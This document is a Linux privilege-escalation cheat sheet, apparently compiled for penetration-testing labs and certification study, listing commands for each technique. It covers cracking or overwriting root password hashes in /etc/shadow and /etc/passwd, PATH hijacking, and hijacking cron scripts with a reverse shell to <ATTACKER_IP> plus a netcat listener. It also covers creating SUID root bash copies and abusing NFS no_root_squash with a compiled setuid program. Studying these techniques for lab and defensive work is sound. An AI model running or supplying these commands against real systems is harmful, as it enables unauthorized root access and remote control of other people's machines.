Checklists:
  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
  https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
  https://payatu.com/guide-linux-privilege-escalation

Readable /etc/shadow:
  ls -l /etc/shadow
  cat /etc/shadow
                Each line of the file represents a user. A user's password hash (if they have one)
                can be found between the first and second colons (:) of each line
  john --wordlist=$ROCKYOU hash.txt
  su root

Writable /etc/shadow:
  ls -l /etc/shadow
  mkpasswd -m sha-512 newpasswordhere
                Generate new password hash with a password of your choice
  vim /etc/shadow
                Edit the /etc/shadow file and replace the original root user's
                epassword hash with the one you just generated
  su root

Writable /etc/passwd:
  ls -l /etc/passwd
                Some versions of Linux will still allow password hashes to be stored there
  openssl passwd newpasswordhere
                Generate a new password hash with a password of your choice
  vim /etc/passwd
                Edit the /etc/passwd file and place the generated password hash between the first 
                and second colon (:) of the root user's row (replacing the "x")
                Alternatively, copy the root user's row and append it to the bottom of the file, 
                changing the first instance of the word "root" to "newroot" and placing the generated 
                password hash between the first and second colon (replacing the "x").
  su root

PATH:
  echo $PATH    If a folder for which your user has write permission is located in the path, you could 
                potentially hijack an application to run a script.
  find / -writable 2>/dev/null | grep home
                 Search for writable folders
                 If any writable folder is listed under PATH we could create a binary
                 named thm under that directory and have our “path” script run it
  export PATH=/tmp:$PATH
                 If the folder we want to write to is not in PATH, we can just add it


Cron Jobs - File Permissions:
  cat /etc/crontab
                View the contents of the system-wide crontab.
  locate script.sh
                If there is a scheduled task that runs with root privileges and we
                can change the script that will be run, then our script will run
                with root privileges.
                Locate the full path of the script
  ls -l /usr/local/bin/script.sh
                Check if that the file is word-writable
  echo '#!/bin/bash
  bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > /usr/local/bin/script.sh
                Replace the contents of the script.sh file with the following after changing the IP address
  nc -nvlp 4444
                Set up a netcat listener on attacker machine and wait for the cron job to run

Cron Jobs - PATH Environment Variable:
  cat /etc/crontab
                View the contents of the system-wide crontab, let's say the PATH
                variable starts with /home/user
  echo '#!/bin/bash
  cp /bin/bash /tmp/rootbash
  chmod +xs /tmp/rootbash' > overwrite.sh
                Create a file called overwrite.sh in your home directory
  chmod +x /home/user/overwrite.sh
  /tmp/rootbash -p
                Wait for the cron job to run and Run the /tmp/rootbash command with
                -p to gain a shell running with root privileges

Capabilities:
  getcap -r / 2>/dev/null
                List binaries that have set capabilities
                Capabilities help manage privileges at a more granular level. 
                For example, if the SOC analyst needs to use a tool that needs to
                initiate socket connections, a regular user would not be able to do
                that. If the system administrator does not want to give this user 
                higher privileges, they can change the capabilities of the binary
                GTFObins has a good list of binaries that can be leveraged for privilege
                escalation if we find any set capabilities.

NFS:
  cat /etc/exports
                If NFS configuration is misconfigured is kept in the /etc/exports file
                and the option no_root_squash is present on a writable share, we can create
                an executable with SUID bit set and run it on the target system.
  showmount -e IP_ADDRESS
                Enumerating mountable shares from our attacking machine
  mkdir /tmp/sharedfolder
  sudo mount -o rw IP_ADDR:/home/ubuntu/sharedfolder /tmp/sharedfolder
                Mount one of the “no_root_squash” shares to our attacking machine and start 
                building our executable. 
echo 'int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}' > nfs.c
                 As we can set SUID bits, a simple executable that will run /bin/bash
                 on the target system will do the job. 
  gcc nfs.c -o nfs -w
                 Once we compile the code we will set the SUID bit
  chmod +s nfs
  ./nfs          On the target system get root priveleges
  id


Potential Privesc vectors to look out:
  Service Exploits
  Environment Variables
  Cron Jobs - Wildcards
  SUID / SGID Executables
  Passwords & Keys - History Files
  Passwords & Keys - Config Files
  Passwords & Keys - SSH Keys
  PrivEsc Scripts
